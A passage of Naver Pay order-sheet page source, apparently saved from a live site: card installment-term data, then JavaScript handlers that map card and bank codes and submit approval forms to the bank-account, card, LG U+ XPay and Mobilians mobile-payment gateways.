type":"02","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2,3,4","chrgtype":"01","frinttypename":"부분","frintseq":"10004033","month":"12","corpcd":"C4","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"}],"C5":[{"chrgpct":"0","chrgtype":"01","partmos":"","frinttypename":"","cardproductcode":"C313810","month":"12","corpcd":"C5","frinttype":"03","corpname":"","chrgtypename":"PG","minamt":"300000"},{"chrgpct":"0","chrgtype":"01","partmos":"","frinttypename":"","cardproductcode":"C313810","month":"18","corpcd":"C5","frinttype":"03","corpname":"","chrgtypename":"PG","minamt":"300000"},{"chrgpct":"0","chrgtype":"01","partmos":"","frinttypename":"","cardproductcode":"C313810","month":"24","corpcd":"C5","frinttype":"03","corpname":"","chrgtypename":"PG","minamt":"300000"},{"chrgpct":"0","chrgtype":"01","partmos":"","frinttypename":"","cardproductcode":"C313810","month":"36","corpcd":"C5","frinttype":"03","corpname":"","chrgtypename":"PG","minamt":"300000"},{"chrgpct":"0","chrgtype":"01","partmos":"","frinttypename":"","cardproductcode":"C313809","month":"12","corpcd":"C5","frinttype":"03","corpname":"","chrgtypename":"PG","minamt":"300000"},{"chrgpct":"0","chrgtype":"01","partmos":"","frinttypename":"","cardproductcode":"C313809","month":"18","corpcd":"C5","frinttype":"03","corpname":"","chrgtypename":"PG","minamt":"300000"},{"chrgpct":"0","chrgtype":"01","partmos":"","frinttypename":"","cardproductcode":"C313809","month":"24","corpcd":"C5","frinttype":"03","corpname":"","chrgtypename":"PG","minamt":"300000"},{"chrgpct":"0","chrgtype":"01","partmos":"","frinttypename":"","cardproductcode":"C313809","month":"36","corpcd":"C5","frinttype":"03","corpname":"","chrgtypename":"PG","minamt":"300000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004024","month":"2","corpcd":"C5","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004024","month":"3","corpcd":"C5","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004024","month":"4","corpcd":"C5","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"}],"C7":[{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004019","month":"2","corpcd":"C7","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004019","month":"3","corpcd":"C7","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004019","month":"4","corpcd":"C7","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004019","month":"5","corpcd":"C7","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004019","month":"6","corpcd":"C7","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2,3,4","chrgtype":"01","frinttypename":"부분","frintseq":"10004020","month":"10","corpcd":"C7","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2,3,4,5","chrgtype":"01","frinttypename":"부분","frintseq":"10004021","month":"12","corpcd":"C7","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2,3,4,5,6,7","chrgtype":"01","frinttypename":"부분","frintseq":"10004022","month":"18","corpcd":"C7","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2,3,4,5,6,7,8,9","chrgtype":"01","frinttypename":"부분","frintseq":"10004023","month":"24","corpcd":"C7","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"}],"CA":[{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004028","month":"2","corpcd":"CA","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004028","month":"3","corpcd":"CA","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004028","month":"4","corpcd":"CA","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004028","month":"5","corpcd":"CA","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004028","month":"6","corpcd":"CA","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004028","month":"7","corpcd":"CA","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004028","month":"8","corpcd":"CA","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2,3","chrgtype":"01","frinttypename":"부분","frintseq":"10004029","month":"10","corpcd":"CA","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2,3,4","chrgtype":"01","frinttypename":"부분","frintseq":"10004030","month":"12","corpcd":"CA","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"}],"CB":[{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004014","month":"2","corpcd":"CB","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004014","month":"3","corpcd":"CB","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004014","month":"4","corpcd":"CB","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004014","month":"5","corpcd":"CB","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004014","month":"6","corpcd":"CB","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004014","month":"7","corpcd":"CB","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2,3","chrgtype":"01","frinttypename":"부분","frintseq":"10004123","month":"10","corpcd":"CB","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2,3,4","chrgtype":"01","frinttypename":"부분","frintseq":"10004124","month":"12","corpcd":"CB","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"}]},
			"isWindow" : true,
			"cphSmplRegYn" : "N",
			"cphSmplAgrYn" : "N",
			"cphSmplCorpCd" : " ",
			"cphSmplPayNo" : " ",
			"appliedPinPay" : true,
			"expDate" : "20220316",
			"isNaverPayPasswordAvailable" : false,
			"" : ""
			});
			
			
			nmp.registerModule(nmp.front.order.order_sheet.storage, {
				"orderSnapshotKey":"b78c81ab-8b44-486f-a3da-75000ef66b86",
				"exposurePayLaterTutorial" : false
			});
			
			
			nmp.registerModule(nmp.front.order.order_glad, {
				"gfdUrl" : "http://internal.pay.naver.com/ad/seg",
				"divId" : "chargePointTabBanner",
				"unitId" : "p_pay_dicon_point",
				"spwp" : spwp
			});
			</script>
																		   
			<script type="text/javascript">
			
			
			function init_40A() {
				return true;
			}
			
			
			function getUrl_40A() {
				var url = "";
						url = "http://pay.naver.com/send";
				return url;
			}
			
			function pgApproval_40A(fm) {
				return "success";
			}
			function approval_40A(common, form, callbackFn, callbackFn2) {
			
				bill.variable._lastCallbackFn = callbackFn;
				bill.variable._returnForm = form;
				bill.variable._returnCommonForm = common;
			
				var cKey = common.value('CKEY');
			
				bill.initAccountInfo(function(success){
					if(!success){ 
						callbackFn('error');
						return;
					}
			
					var _callbackApproval = function() {
						if(cKey) {
							form.value('ACCTKEY', cKey);
						}
						var result = pgApproval_40A(form.$value());
						callbackFn( result );
					};
			
					if(cKey){
						return _callbackApproval();
					} else {
						//기존 로직, 하위호환성 보장을 위해 남겨둠. 복수계좌건에 대해 페이 모두 배포하면 삭제해도 무방.
						var resultCode = bill.variable._oneClickBankInfo.$("resultCode");
						var bankCd = bill.variable._oneClickBankInfo.$("bnkCd");
						var corpCd = common.value('CORPCD');
								
						if((bankCd == corpCd) && resultCode == '1001') {
							var bankCd = bill.variable._oneClickBankInfo.$("bnkCd");
							var input_rurl = common.value('RURL');
							var input_curl = common.value('CURL');
							var corpCd = common.value('CORPCD');
							if (bill.variable._device == 'MOBILE') {
								regType = 'I';
								var getParams = "/m/account/verifyDepositAuth?returnUrl=" + encodeURIComponent(input_rurl) + "&cancelUrl=" + encodeURIComponent(input_curl);
								
								
								var tForm = document.getElementById("pgForm_40A");
								tForm.action=getUrl_40A()+getParams;
								tForm.target=common.value('PREIFRAME');
								if (typeof callbackFn2 == 'function') {
									common.value('MSG','success');
									common.value('PGFORMNAME','pgForm_40A');
									common.value('CHARSET', 'euc-kr');
									callbackFn2(common.$value());
								} else {
									tForm.submit();
								}
								
							} else {
								input_rurl+='?mode=P';
								input_curl+='?mode=P';
								regType = 'P';
								var getParams = "/p/account/verifyDepositAuth?returnUrl=" + encodeURIComponent(input_rurl) + "&cancelUrl=" + encodeURIComponent(input_curl);
								bill.getForm(getUrl_40A()+getParams, regType, 'approval_frame_40A');
							}
						} else {
							var bankCd = bill.variable._oneClickBankInfo.$("bnkCd");
							if (bankCd == 'undefined' || bankCd == '' || bankCd == null || bankCd == 'null') {
								
								var input_rurl = common.value('RURL');
								var input_curl = common.value('CURL');
								var corpCd = common.value('CORPCD');
								if (bill.variable._device == 'MOBILE') {
									regType = 'I';
									var getParams =  "/m/account/registerAccount"+"?bankCode="+encodeURIComponent(corpCd)+"&returnUrl=" + encodeURIComponent(input_rurl) + "&cancelUrl=" + encodeURIComponent(input_curl);
								
									var tForm = document.getElementById("pgForm_40A");
									tForm.action=getUrl_40A()+getParams;
									tForm.target=common.value('PREIFRAME');
									if (typeof callbackFn2 == 'function') {
										common.value('MSG','success');
										common.value('PGFORMNAME','pgForm_40A');
										common.value('CHARSET', 'euc-kr');
										callbackFn2(common.$value());
									} else {
											tForm.submit();
									}
								} else {
									input_rurl+='?mode=P';
									input_curl+='?mode=P';
									regType = 'P';
									var getParams = "/p/account/registerAccount"+"?bankCode="+encodeURIComponent(corpCd)+"&returnUrl=" + encodeURIComponent(input_rurl) + "&cancelUrl=" + encodeURIComponent(input_curl);
									bill.getForm(getUrl_40A()+getParams, regType, 'approval_frame_40A');
								}
							} else {
								var bankCd = bill.variable._oneClickBankInfo.$("bnkCd");
								var corpCd = common.value('CORPCD');
								if(bankCd != corpCd){
									var resultCode = bill.variable._oneClickBankInfo.$("resultCode");
									if(resultCode == '1001'){
										msg = '등록대기 상태의 계좌가 있습니다. 다른 계좌를 등록하시려면 등록대기 상태 계좌는 삭제됩니다. 계속 진행하시겠습니까?';
										if(confirm(msg)){
											bill.commonTransferDataWithJsonp(bill.variable._removeAccountUrl,$H({rsvseq : common.value('RSVSEQ'), chnl : common.value('CHNL'), userkey : common.value('USERKEY'), NAMES :"rsvseq, chnl, userkey"})
												, function(result){
												if( result == 'error'){ callbackFn('error');}
												else if( result.rtncd == '000'){
													form.value('MSG',result.msg);
													callbackFn('nomatcherror');
												}else{
													var input_rurl = common.value('RURL');
													var input_curl = common.value('CURL');
													var corpCd = common.value('CORPCD');
													if (bill.variable._device == 'MOBILE') {
														regType = 'I';
														var getParams =  "/m/account/registerAccount"+"?bankCode="+encodeURIComponent(corpCd)+"&returnUrl=" + encodeURIComponent(input_rurl) + "&cancelUrl=" + encodeURIComponent(input_curl);
														
														var tForm = document.getElementById("pgForm_40A");
														tForm.action=getUrl_40A()+getParams;
														tForm.target=common.value('PREIFRAME');
														if (typeof callbackFn2 == 'function') {
															common.value('MSG','success');
															common.value('PGFORMNAME','pgForm_40A');
															common.value('CHARSET', 'euc-kr');
															callbackFn2(common.$value());
														} else {
																tForm.submit();
														}
													} else {
														input_rurl+='?mode=P';
														input_curl+='?mode=P';
														regType = 'P';
														var getParams = "/p/account/registerAccount"+"?bankCode="+encodeURIComponent(corpCd)+"&returnUrl=" + encodeURIComponent(input_rurl) + "&cancelUrl=" + encodeURIComponent(input_curl);
														bill.getForm(getUrl_40A()+getParams, regType, 'approval_frame_40A');
												
													}
													
												}
												
											})		
										}else{
											callbackFn('error');
										}	
									}else{
										var msg = '신규계좌 등록은 네이버페이 > 설정 > 결제/송금 계좌관리에서 가능하며, 등록 후에도 계좌가 보이지 않으면 주문서를 새로고침 해주세요.';
										alert(msg);
										location.reload();
									}
									
								}else{
									return _callbackApproval();
								}
							}
						}
					}
			
				}, cKey);
			}
			
			</script>
			<!-- iframe?? ??????吏? ?븡?? 寃? -->
			
			<div id="51A_OBJECT"></div>
			<script type="text/javascript">
			
			//pg사 carcd로 변환하는 코드를 생성한다.
			var bill_oneClickCardcdMap = $H();
			bill_oneClickCardcdMap.add('C0','CCLG');
			bill_oneClickCardcdMap.add('C1','CCBC');
			bill_oneClickCardcdMap.add('C3','CCKM');
			bill_oneClickCardcdMap.add('C4','CCNH');
			bill_oneClickCardcdMap.add('C5','CCLO');
			bill_oneClickCardcdMap.add('C7','CCSS');
			bill_oneClickCardcdMap.add('C9','CCCT');
			bill_oneClickCardcdMap.add('CA','CCKE');
			bill_oneClickCardcdMap.add('CB','CCPH');
			bill_oneClickCardcdMap.add('CF','CCHN');
			bill_oneClickCardcdMap.add('CH','CCDI');
			bill_oneClickCardcdMap.add('CP','CCKA');
			
			//pg사 carcd로 변환하는 코드를 생성한다.
			var bill_oneClickCardQuotaMap = $H();
			bill_oneClickCardQuotaMap.add('01','0' );
			bill_oneClickCardQuotaMap.add('02','2' );
			bill_oneClickCardQuotaMap.add('03','3' );
			bill_oneClickCardQuotaMap.add('04','4' );
			bill_oneClickCardQuotaMap.add('05','5' );
			bill_oneClickCardQuotaMap.add('06','6' );
			bill_oneClickCardQuotaMap.add('07','7' );
			bill_oneClickCardQuotaMap.add('08','8' );
			bill_oneClickCardQuotaMap.add('09','9' );
			bill_oneClickCardQuotaMap.add('10','10' );
			bill_oneClickCardQuotaMap.add('11','11' );
			bill_oneClickCardQuotaMap.add('12','12' );
			bill_oneClickCardQuotaMap.add('18','18' );
			bill_oneClickCardQuotaMap.add('24','24' );
			bill_oneClickCardQuotaMap.add('36','36' );
			
			
			function convertCardCd_51A(cardcd){
				if(bill_oneClickCardcdMap.hasKey(cardcd)) {
					return bill_oneClickCardcdMap.$(cardcd);
				}
				return '';
			}
			function convertToNonzeroMonth(month){
				if(month.charAt('0') == '0'){
					return month.charAt('1');
				}
				else{
					return month;
				}
			}
			
			var bill_oneClickCardIspMap = $H();
			bill_oneClickCardIspMap.add('42','0100' );
			bill_oneClickCardIspMap.add('35','1600' );
			bill_oneClickCardIspMap.add('34','1800' );
			bill_oneClickCardIspMap.add('33','0100' );
			bill_oneClickCardIspMap.add('31','0100' );
			bill_oneClickCardIspMap.add('11','0204' );
			bill_oneClickCardIspMap.add('46','1500' );
			
			function convertIspMap_51A(cardcd){
				if(bill_oneClickCardIspMap.hasKey(cardcd)) {
					return bill_oneClickCardIspMap.$(cardcd);
				}
				return '';
			}
			
			function convertQuota_51A(quota){
				if(bill_oneClickCardQuotaMap.hasKey(quota)) {
					return bill_oneClickCardQuotaMap.$(quota);
				}
				return '';
			}
			
			function init_51A() {
				return true;
			}
			
			function pgApproval_51A(fm) {
				return "success";	
			}
			
			function approval_51A(common, form, callbackFn, callbackFn2) {
				bill.variable._lastCallbackFn = callbackFn;
				bill.variable._returnForm = form;
				bill.variable._returnCommonForm = common;
				var ckey = common.value('CKEY');
				
				bill.initOneClickCardInfo(function(success){
					if(!success){ 
						callbackFn('error');
						return;
					}
			
					var install = convertQuota_51A(common.value('INSTMO'));
					if(install == '') {
						install = "00";
					} else if( install.length == 1) {
						install = "0" + install;
					}
					form.value('OC_INSTMO', install);
					
					form.value('PGID', bill.convertPgId('51277', common.value('CORPCD'), install, common.value('AMT')));
					form.value('mid_common', bill.convertPgMid('51277', common.value('CORPCD'), install, 'naver_smartstore05', common.value('AMT')));
					form.value('mid_point', bill.convertPgSubMid('51277', common.value('CORPCD'), install, 'naver_smartstore05', common.value('AMT')));
					
					if (bill.isDefermentPay('51277', common.value('CORPCD'), install, common.value('AMT'))) {
						form.value('OC_NOINT_NDISP', '1');
					} else {
						form.value('OC_NOINT_NDISP', '');
					}
					
					if(common.value('POINTFG') == 'Y' ) {
						form.value('OC_POINTUSE', 'Y');	
						form.value('OC_MID', form.value('mid_point'));
					} else {
						form.value('OC_POINTUSE', 'N');	
						form.value('OC_MID', form.value('mid_common'));
					}
					
					if( common.value('NOINTEREST') == 'Y' && common.value('NOINTERESTTYPE') == '01') {
						form.value('OC_NOINT', '1');	
					} else {
						form.value('OC_NOINT', '0');
					}
			
					var regType = 'P';
					form.value('OC_REGTYPE', regType);
					var input_rurl = common.value('RURL');
					var input_curl = common.value('CURL');
					var corpCd = common.value('CORPCD');
			
					if (ckey){
						form.value('AUTHNO', ckey);
						common.value('AUTHNO', ckey);
					} else{
						var virSeq = bill.findOneClickCardInfo(common.value('CORPCD'));
						if (virSeq == 'undefined' || virSeq == '' || virSeq == null || virSeq == 'null') {
							alert('결제하려는 카드가 등록되어 있지 않습니다. 결제정보를 다시 확인해주세요.');
							return;
						} else {
							form.value('AUTHNO', virSeq);
							common.value('AUTHNO', virSeq);
						}
					}
			
					var result = pgApproval_51A(form.$value());
					callbackFn( result );
			
				}, ckey);
				
			}
			</script>
			
			<script language="javascript" src="http://xpay.uplus.co.kr/xpay/js/xpay_crossplatform.js" type="text/javascript"></script>
			<script type="text/javascript">
			var bill_bankcdMap = $H();
			bill_bankcdMap.add('002','02');
			bill_bankcdMap.add('003','03');
			bill_bankcdMap.add('004','04');
			bill_bankcdMap.add('005','05');
			bill_bankcdMap.add('007','07');
			bill_bankcdMap.add('011','11');
			bill_bankcdMap.add('020','20');
			bill_bankcdMap.add('209','209');
			bill_bankcdMap.add('023','23');
			bill_bankcdMap.add('230','230');
			bill_bankcdMap.add('240','240');
			bill_bankcdMap.add('243','243');
			bill_bankcdMap.add('269','269');
			bill_bankcdMap.add('027','27');
			bill_bankcdMap.add('278','278');
			bill_bankcdMap.add('031','31');
			bill_bankcdMap.add('032','32');
			bill_bankcdMap.add('034','34');
			bill_bankcdMap.add('035','35');
			bill_bankcdMap.add('037','37');
			bill_bankcdMap.add('039','39');
			bill_bankcdMap.add('045','45');
			bill_bankcdMap.add('048','48');
			bill_bankcdMap.add('071','71');
			bill_bankcdMap.add('081','81');
			bill_bankcdMap.add('088','88');
			bill_bankcdMap.add('092','92');
			
			function convertBankCd_04F(bankcd){
				if(bill_bankcdMap.hasKey(bankcd)) {
					return bill_bankcdMap.$(bankcd);	
				}
				return '';
			}
			
			function init_04F() {
			
			}
			
			function pgApproval_04F(fm, svccode) {
				lgdwin = openXpay(fm, svccode, 'iframe', null, "520", "520");
			}
			
			function approval_04F(common, form, callbackFn) {
				bill.variable._lastCallbackFn = callbackFn;
				bill.variable._returnForm = form;
				bill.variable._returnCommonForm = common;
				
				form.value('LGD_BUYER', common.value('USERID'));
				form.value('LGD_PRODUCTINFO', common.value('TITLE'));
				form.value('LGD_AMOUNT', common.value('AMT'));
				form.value('LGD_OID', common.value('SID'));
				form.value('LGD_RETURNURL', common.value('RURL'));
				
				//PG 모듈 호출
				var result = pgApproval_04F(form.$value(), "service");
			}
			</script><script type="text/javascript">
			function pgApproval_60A(fm) {
				return 'success';
			}
			
			function init_60A() {
				;
			}
			
			function approval_paramInit_60A(form) {
				form.value('mUserKey','');
				form.value('Okurl', '');
				form.value('Cryptstring', '');
				form.value('Failurl', '');
				form.value('Prdtprice', '');
			}
			
			function approval_60A(common, form, callbackFn, callbackFn2) {
				var result;
				approval_paramInit_60A(form);
				
				var command = "NAVER_NJOIN"; 
				if (bill.variable._device == "MOBILE") {
					command = "NAVER_NJOIN_M"; 
				}
				
				if (common.value('JOINSTATUS') == 'N') {
					form.value('JOIN_STATUS', 'N');
				}
				
				if (common.value('LOSTPWCHANGEFG') == "Y") {
					form.value('MC_JOIN_TYPE', 'A');
					pgApproval_60A_auth(common, form, command, callbackFn, callbackFn2);
				}else if (common.value('ISSKNORMALUSER') == 'NONE' && form.value('JOIN_STATUS') != "Y") {
					form.value('MC_JOIN_TYPE', 'J');
					pgApproval_60A_auth(common, form, command, callbackFn, callbackFn2);
				} else {
					result = pgApproval_60A(form.$value()); 
					callbackFn( result );
				}
			}
			
			
			function pgPreApproval_06A_DELIVERAUTH (common, form) {
				var str = {
				cpid : 'shopN',
				pgcd : '60', 
				NAMES :"cpid, pgcd"
				};
				return str;
			}
			
			function pgApproval_60A_auth(common, form, type, callbackFn, callbackFn2) {
				bill.variable._lastCallbackFn = callbackFn;
				bill.variable._returnForm = form;
			
				var preCertApprovalString = pgPreApproval_06A_DELIVERAUTH(common, form);	
				bill.commonTransferData(bill.variable._preCertUrl, $H(preCertApprovalString), function(str){
					if( str == 'error'){ callbackFn('error');}
					
					var orgCharset = document.charset;
					form.value('MC_SVCID', str.mkey1);
					form.value('smobileSid', str.sid);
					var Cryptstring	= common.value('AMT') + common.value('RURL');
					bill.encryptWithCors('enc','60A',$H({Okurl : common.value('RURL'), Cryptstring :Cryptstring, Failurl : common.value('CURL'), Notiurl : common.value('RURL'), Prdtprice : common.value('AMT'), HASHKEY: str.sid, VER : "2", NAMES : 'Okurl, Failurl, Notiurl, Prdtprice, Cryptstring, VER, HASHKEY'}), 
						function(result){
							if( result == 'error'){ callbackFn('error');}
							form.value('Cryptstring', result.Cryptstring);
							form.value('Okurl', result.Okurl);
							form.value('Failurl', result.Failurl);
							form.value('Prdtprice', result.Prdtprice);
							form.value('Cryptyn', 'Y');
											form.value('PAY_MODE', '10');
							form.value('Prdtnm', common.value('TITLE'));
							form.value('Siteurl', 'checkout.naver.com');
							form.value('Tradeid', str.sid);
							form.value('LOGO_YN', 'Y');
							form.value('CALL_TYPE', 'I');
							form.value('IFRAME_NAME', common.value('PREIFRAME'));
							form.value('MC_No', common.value('PAYNO'));
							form.value('MC_FIXNO', 'Y');
							form.value('Payeremail', '');
							form.value('Userid', common.value('USERID'));
							form.value('Item', '');
							form.value('Prdtcd', '');
							form.value('Closeurl', common.value('CLOSEURL'));
							form.value('MSTR', '');
							form.value('CP_UI', type);
							
							var callUrl = "http://mup.mobilians.co.kr/MUP/goMcashMain.mcash";
							
							var tForm = document.getElementById("pgForm_60A");
			
							tForm.action=callUrl;
							tForm.target=common.value('PREIFRAME');
							if (typeof callbackFn2 == 'function') {
								common.value('MSG','success');
								common.value('PGFORMNAME','pgForm_60A');
								common.value('CHARSET', 'UTF-8');
								callbackFn2(common.$value());
							} else {
								tForm.submit();
							}
							
							return false;
						}
					);
					
					
				
					}
				)
				
			}
			</script><script type="text/javascript">
			var bill_mobilFrameType = $H();
			bill_mobilFrameType.add('PC_CHECKOUT','CO' );
			bill_mobilFrameType.add('PC_SELLERCENTER','SC' );
			bill_mobilFrameType.add('PC_MERCHANTCENTER','CP' );
			bill_mobilFrameType.add('MOBILE_CHECKOUT','CO' );
			bill_mobilFrameType.add('MOBILE_MARKET','RM' );
			bill_mobilFrameType.add('MOBILE_BAND','BD' );
			
			function takeIframe_05A(type) {
				if (bill_mobilFrameType.hasKey(type)) {
					return bill_mobilFrameType.$(type);
				}
				return "";
			}
			
			function getIframeUrl_05A() {
				var MCASH_MAIN_URL ="";
					MCASH_MAIN_URL = "http://mup.mobilians.co.kr/MUP/goMcash.mcash";
				return MCASH_MAIN_URL;
			}
			
			function init_05A() {
				return false;
			}
			
			function pgApproval_05A(fm) {
				return 'success';
			}
			
			function approval_05A(common, form, callbackFn, callbackFn2) {
				var result ;
				approval_paramInit_05A(form);
				if (common.value('ISSKNORMALUSER') == 'Y') {
					result= pgApproval_05A(form.$value());
					callbackFn( result );
				} else if (common.value('CORPCD') == 'SKT' && common.value('ISSKNORMALUSER') == 'N'){
					result = pgPreApproval_05A(common, form, callbackFn, callbackFn2);
				} else if (common.value('ISSKNORMALUSER') == 'NONE') {
					var command = "NAVER_NW";
					if (bill.variable._device == "MOBILE") {
						command = "NAVER_NM";
					}
					pgApproval_05A_auth(common, form, command, callbackFn, callbackFn2);
				} else {
					callbackFn( 'error : unsupported' );
				}
			}
			
			function approval_paramInit_05A(form) {
				form.value('mUserKey','');
				form.value('Okurl', '');
				form.value('Cryptstring', '');
				form.value('Failurl', '');
				form.value('Prdtprice', '');
				form.value('SocialNo', '');
			}
			
			function pgPreApproval_05A(common, form, callbackFn, callbackFn2) {
				var command = "CERT";
				if (bill.variable._device == "MOBILE") {
					command = "MCERT";
				}
				return authenticateWithMcash(common, form, command, callbackFn, callbackFn2);
			}
			
			function postApproval_05A(common, form, callbackFn, callbackFn2) {
				pgPostApproval_05A(common, form, callbackFn, callbackFn2);
				return false;
			}
			
			function pgPostApproval_05A(common, form, callbackFn, callbackFn2) {
				var command = "CNFM";
				if (bill.variable._device == "MOBILE") {
					command = "MCNFM";
				}
				authenticateWithMcash(common, form, command, callbackFn, callbackFn2);
				return false;
			}
			
			function authenticateWithMcash(common, form, type, callbackFn, callbackFn2){
				bill.variable._lastCallbackFn = callbackFn;
				bill.variable._returnForm = form;
				
				var iframeType = takeIframe_05A(common.value('IFRAMETYPE'));
				var Cryptstring	= common.value('AMT') + common.value('RURL');	
			
				bill.encryptWithCors('enc','05A',$H({Okurl : common.value('RURL'), Cryptstring :Cryptstring, Failurl : common.value('CURL'), Prdtprice : common.value('AMT'), SocialNo : common.value('RESNO'), HASHKEY: common.value('SID'), NAMES : 'Okurl, Failurl, SocialNo, HASHKEY, Prdtprice, Cryptstring'}), 
					function(result){
						if( result == 'error'){ callbackFn('error');} 	
						form.value('Okurl', result.Okurl); 
						form.value('Cryptstring', result.Cryptstring); 
						form.value('Failurl', result.Failurl); 
						form.value('Prdtprice', result.Prdtprice); 
						form.value('SocialNo', result.SocialNo); 
						form.value('CP_UI', type);
						form.value('Prdtnm', common.value('TITLE'));
						form.value('Siteurl', 'checkout.naver.com');
						form.value('Tradeid', common.value('SID'));
						form.value('MC_SVCID', '120109480001');
						form.value('MC_FIXCOMMID', common.value('CORPCD'));
						form.value('MC_No', common.value('PAYNO'));
						form.value('MSTR', '');
						form.value('Payeremail', '');
						form.value('Userid', '');
						form.value('Prdtcd', '');
						form.value('Item', '');
						form.value('CP_UI_STYLE', iframeType);
						form.value('Closeurl', common.value('CLOSEURL'));
						
						if (type == 'CNFM' || type == 'MCNFM') {
							form.value('ansimFlag', common.value('ANSIMFG'));
							form.value('safeguard', common.value('SAFEFG'));
							form.value('phoneId', common.value('PAYKEY'));
							form.value('Mobilid', common.value('AUTHNO'));
						}
						
						
						var tForm = document.getElementById("pgForm_05A");
						if(type == 'CERT' || type == 'MCERT'){
							tForm.target=common.value('PREIFRAME');
						}else{
							tForm.target=common.value('POSTIFRAME');
						}
						
						tForm.action=getIframeUrl_05A();
						if (typeof callbackFn2 == 'function') {
							common.value('MSG','success');
							common.value('PGFORMNAME','pgForm_05A');
							common.value('CHARSET', 'UTF-8');
							callbackFn2(common.$value());
						} else {
							tForm.submit();
						}
						
						
					}
				);
			}
			
			function pgApproval_05A_auth(common, form, type, callbackFn, callbackFn2) {
				bill.variable._lastCallbackFn = callbackFn;
				bill.variable._returnForm = form;
				
				var Cryptstring	= common.value('AMT') + common.value('RURL');
				
				bill.encryptWithCors('enc','05A',$H({Okurl : common.value('RURL'), Cryptstring :Cryptstring, Failurl : common.value('CURL'), Notiurl : common.value('RURL'), Prdtprice : common.value('AMT'), HASHKEY: common.value('SID'), VER : "2", NAMES : 'Okurl, Failurl, Notiurl, Prdtprice, Cryptstring, VER, HASHKEY'}), 
					function(result){
						if( result == 'error'){ callbackFn('error');}
						form.value('Cryptstring', result.Cryptstring);
						form.value('Okurl', result.Okurl);
						form.value('Failurl', result.Failurl);
						form.value('Prdtprice', result.Prdtprice);
						form.value('Cryptyn', 'Y');
						form.value('MC_SVCID', '120109480001');
						form.value('PAY_MODE', '10');
						form.value('Prdtnm', common.value('TITLE'));
						form.value('Siteurl', 'checkout.naver.com');
						form.value('Tradeid', common.value('SID'));
						form.value('LOGO_YN', 'Y');
						form.value('CALL_TYPE', 'I');
						form.value('IFRAME_NAME', common.value('PREIFRAME'));
						form.value('MC_No', common.value('PAYNO'));
						form.value('MC_FIXNO', 'Y');
						form.value('Payeremail', '');
						form.value('Userid', '');
						form.value('Item', '');
						form.value('Prdtcd', '');
						form.value('Closeurl', common.value('CLOSEURL'));
						form.value('MSTR', '');
						form.value('CP_UI', type);
				
						var callUrl = "http://mup.mobilians.co.kr/MUP/goMcashMain.mcash";
						
						var tForm = document.getElementById("pgForm_05A");
						
				
						tForm.action=callUrl;
						tForm.target=common.value('PREIFRAME');
